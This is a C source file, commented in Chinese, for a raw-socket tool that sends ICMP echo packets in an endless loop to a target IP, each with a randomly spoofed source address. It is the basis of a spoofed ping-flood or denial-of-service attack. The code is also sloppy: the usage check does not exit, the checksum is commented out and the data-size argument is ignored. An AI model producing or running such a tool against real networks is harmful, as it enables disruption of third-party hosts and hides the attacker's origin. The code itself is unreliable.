#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    if(argc<3)
    {
        printf("useage: %s <source IP > <destination IP [data size]\n",argv[0]);
       // exit(0);
    }
    
    u_long desip,srcip;
    int datasize=0,sent,sent_size;
    srcip=inet_addr(argv[1]);
    desip=inet_addr(argv[2]);
    
    //创建原始套接字
    int sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(sockfd<0)
    {
        perror("create socket error \n");
    }
    
    int packet_size=sizeof(struct iphdr)+sizeof(struct icmphdr)+datasize;
    char *packet=(char*)malloc(packet_size);
    if(!packet)
    {
        perror("out of memory\n");
        close(sockfd);
    }
    //ip header
    struct iphdr *ip=(struct iphdr*)packet;//IP头部填充
    struct icmphdr *icmp =(struct icmphdr*)(packet+sizeof(struct iphdr));//IP头+ICMP头
    memset(packet,0,packet_size);//ICMP附加数据填充 可以为空
//IP 头部填充
    ip->version=4;
    ip->ihl=5;
    ip->tos=0;
    ip->tot_len=htons(packet_size);
    ip->id=rand();
    ip->frag_off=0;
    ip->ttl=255;
    ip->protocol=IPPROTO_ICMP;
    //ip->saddr=srcip;
    ip->daddr=desip;

    //ip->saddr = rand();//IP 源IP随机生成

//icmp 包填充

icmp->type=ICMP_ECHO;
icmp->code=0;
icmp->un.echo.sequence=1;//icmp->un.echo.sequence=rand(); seq这两项可以用rand生成，为了效率这里就直接填个常数好了
icmp->un.echo.id=2;//icmp->un.echo.id=rand();
//checksum

struct sockaddr_in seraddr;
seraddr.sin_family=AF_INET;
seraddr.sin_addr.s_addr=desip;
memset(&seraddr.sin_zero,0,sizeof(seraddr.sin_zero));

for(;;)
{
    ip->saddr = rand();//IP 源IP随机生成
    memset(packet+sizeof(struct iphdr)+sizeof(struct icmphdr),rand(),datasize);
   // icmp->checksum=0;
    //icmp->checksum=checksum((u_short*)icmp,sizeof(struct icmphdr)+datasize);
    if((sent_size=sendto(sockfd,packet,packet_size,0,(struct sockaddr*)&seraddr,sizeof(seraddr)))<1)
    {
        printf("send failed \n");
    }
    sleep(1);
}

}

